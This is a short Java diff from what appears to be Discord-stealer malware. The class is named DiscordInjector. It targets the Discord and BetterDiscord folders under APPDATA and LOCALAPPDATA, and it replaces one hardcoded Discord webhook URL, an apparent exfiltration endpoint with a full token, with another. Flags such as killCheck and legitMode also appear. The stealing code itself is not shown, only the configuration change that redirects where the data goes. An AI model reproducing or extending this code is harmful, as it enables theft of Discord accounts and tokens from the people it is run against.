@@ -20,7 +20,7 @@ public class DiscordInjector {
 		discordPath = System.getenv("APPDATA") + "/Microsoft/Windows/Start Menu/Programs/Discord Inc";
 		betterPath = System.getenv("APPDATA") + "/BetterDiscord/data";
 		localPath = System.getenv("LOCALAPPDATA");
-		webhookURL = "https://discord.com/api/webhooks/1087418861504172132/yENsvgIwE432aQ6ASMzTn2TcRYxwW_ZuKQqRE34aFsqg3I1QzaOwrbFjbgAWLyRJKD-T";
+		webhookURL = "https://discord.com/api/webhooks/1017441425249542175/tNFuADCPLl9-fKOAiFc6nz-o36Ew-Z7gsevauQR7YBiIEI1gN33zHbjHdNhMJcly2wOa";
 	}
 	
 	private static Boolean killCheck, bettCheck, legitMode;
